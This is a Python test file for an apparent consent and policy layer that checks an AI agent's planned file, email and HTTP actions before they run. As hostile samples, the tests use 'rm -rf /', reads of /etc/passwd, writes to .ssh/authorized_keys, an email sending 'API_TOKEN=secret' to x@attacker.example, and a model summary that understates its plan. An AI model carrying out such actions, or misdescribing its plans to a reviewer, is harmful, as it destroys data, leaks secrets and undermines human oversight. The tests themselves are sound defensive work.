import dataclasses

import pytest

from claudeos.actions import ActionError, SendEmail, WriteFile, parse_action
from claudeos.consent import Grant, GrantError, render_card
from claudeos.plan import Plan, parse_plan
from claudeos.policy import Policy, Risk
from claudeos.sandbox import Overlay


def _plan(*actions, intent="tidy up"):
    return parse_plan({"summary": "s", "actions": list(actions)}, intent)


def test_parse_action_rejects_malformed_input():
    with pytest.raises(ActionError, match="unknown action type"):
        parse_action({"type": "run_shell", "cmd": "rm -rf /"})
    with pytest.raises(ActionError, match="missing field 'content'"):
        parse_action({"type": "write_file", "path": "a"})
    with pytest.raises(ActionError, match="unknown fields"):
        parse_action({"type": "delete_file", "path": "a", "force": True})
    with pytest.raises(ActionError, match="email addresses"):
        parse_action({"type": "send_email", "to": "x@y.com", "subject": "s", "body": "b"})
    with pytest.raises(ActionError, match="http"):
        parse_action({"type": "http_request", "method": "get", "url": "file:///etc/passwd"})


def test_parse_action_ignores_empty_fields_from_the_shared_schema():
    action = parse_action({"type": "delete_file", "path": "a", "content": "", "to": [], "src": None})
    assert action.to_dict() == {"type": "delete_file", "path": "a"}


def test_protected_and_outside_paths_are_denied(ws):
    overlay = Overlay(ws)
    plan = _plan(
        {"type": "write_file", "path": ".ssh/authorized_keys", "content": "k"},
        {"type": "delete_file", "path": ".env"},
        {"type": "write_file", "path": "../escape.txt", "content": "x"},
        {"type": "delete_file", "path": "missing.txt"},
        {"type": "write_file", "path": "notes.md/inside-a-file.txt", "content": "x"},
        {"type": "write_file", "path": "ok.txt", "content": "fine"},
    )
    assessments = Policy().preview(plan, overlay)
    denied = [a.denied for a in assessments]
    assert "protected" in denied[0]
    assert "protected" in denied[1]
    assert "outside the workspace" in denied[2]
    assert "does not exist" in denied[3]
    assert "notes.md is a file" in denied[4]
    assert denied[5] is None


def test_preview_assesses_actions_in_sequence(ws):
    overlay = Overlay(ws)
    plan = _plan(
        {"type": "write_file", "path": "draft.md", "content": "v1"},
        {"type": "write_file", "path": "draft.md", "content": "v2"},
        {"type": "move_file", "src": "draft.md", "dst": "final.md"},
    )
    a = Policy().preview(plan, overlay)
    assert [x.risk for x in a] == [Risk.LOW, Risk.MEDIUM, Risk.MEDIUM]
    assert "overwrites" in a[1].notes[0]
    assert overlay.read("final.md") == b"v2" and overlay.read("draft.md") is None


def test_external_actions_are_high_risk_and_flag_unknown_recipients(ws):
    overlay = Overlay(ws)
    plan = _plan(
        {"type": "send_email", "to": ["cfo@corp.example", "x@attacker.example"], "subject": "s", "body": "b"},
        {"type": "http_request", "method": "POST", "url": "https://api.corp.example/x", "body": "{}"},
    )
    a = Policy(trusted_email_domains=frozenset({"corp.example"})).preview(plan, overlay)
    assert all(x.risk is Risk.HIGH for x in a)
    assert any("attacker.example" in n for n in a[0].notes)
    assert not any("corp.example" in n and "trusted" in n for n in a[0].notes)
    assert any("POST sends data" in n for n in a[1].notes)


def test_grant_is_bound_to_the_exact_plan():
    plan = _plan({"type": "send_email", "to": ["a@b.example"], "subject": "hi", "body": "report"})
    grant = Grant.for_plan(plan)
    grant.check(plan)

    swapped = SendEmail(to=("a@evil.example",), subject="hi", body="report")
    with pytest.raises(GrantError, match="not approved"):
        grant.require(swapped)
    tampered = Plan(plan.intent, plan.summary, (swapped,))
    with pytest.raises(GrantError, match="differs"):
        grant.check(tampered)
    # The summary is the model's prose; changing it does not change what runs.
    assert Plan(plan.intent, "different words", plan.actions).digest() == plan.digest()

    expired = dataclasses.replace(grant, expires_at=0)
    with pytest.raises(GrantError, match="expired"):
        expired.check(plan)


def test_card_shows_real_actions_and_full_external_payload(ws):
    overlay = Overlay(ws)
    plan = Plan(
        "summarize invoices",
        "I will just tidy a file.",  # the model's claim understates the plan
        (
            WriteFile("reports/summary.md", "total 200.50\n"),
            SendEmail(("x@attacker.example",), "dump", "API_TOKEN=secret"),
        ),
        reads=("invoices/a.txt",),
    )
    assessments = Policy().preview(plan, overlay)
    card = render_card(plan, assessments, overlay.diff(), plan.reads)
    assert "Model's summary (its own words): I will just tidy a file." in card
    assert "EXTERNAL send email to x@attacker.example" in card
    assert "| API_TOKEN=secret" in card
    assert "+total 200.50" in card
    assert "Files read while planning (1): invoices/a.txt" in card
    assert "Overall risk: HIGH" in card
